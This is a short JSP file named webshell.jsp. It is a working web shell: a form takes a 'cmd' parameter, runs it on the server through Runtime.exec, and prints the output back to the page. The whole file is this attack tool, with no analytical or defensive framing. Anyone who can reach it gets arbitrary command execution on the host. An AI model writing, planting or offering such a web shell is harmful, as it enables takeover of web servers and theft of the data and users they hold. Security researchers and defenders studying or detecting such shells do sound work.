<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<html>
    <body>
        <form action="webshell.jsp" method="get">
            <input type="text" name="cmd" id="">
        </form>
    </body>
</html>
<pre>
<%
if (request.getParameter("cmd") != null) {
    out.println("Command : " + request.getParameter("cmd") + "<br>");
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while (disr != null) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>
</pre>
